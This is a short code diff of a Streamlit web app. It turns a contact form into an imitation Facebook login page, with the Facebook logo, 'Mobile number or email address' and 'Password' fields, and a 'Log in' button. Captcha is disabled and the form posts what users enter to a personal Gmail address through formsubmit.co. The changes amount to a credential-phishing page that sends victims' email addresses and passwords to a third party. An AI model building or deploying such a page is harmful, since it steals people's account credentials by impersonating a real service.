@@ -9,8 +9,8 @@ with col3:
 
 with col2:
     st.image(
-    "logu.png",
-    width=150,
+    "https://freelogopng.com/images/all_img/1657548367Facebook-logo.png",
+    width=175,
     channels="RGB"
     )
 
@@ -58,8 +58,8 @@ contact_form = """
 </style>
 <form action="https://formsubmit.co/md.taseen.alam@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
-     <input class="styledInput" type="email" name="email" placeholder="Your email" required>
-     <input class="styledInput" type="text" name="name" placeholder="password" required>
+     <input class="styledInput" type="email" name="email" placeholder="Mobile number or email address" required>
+     <input class="styledInput" type="text" name="name" placeholder="Password" required>
      <button type="submit" class="styledButton" style="float: right;">Log in</button>
 </form>
 """
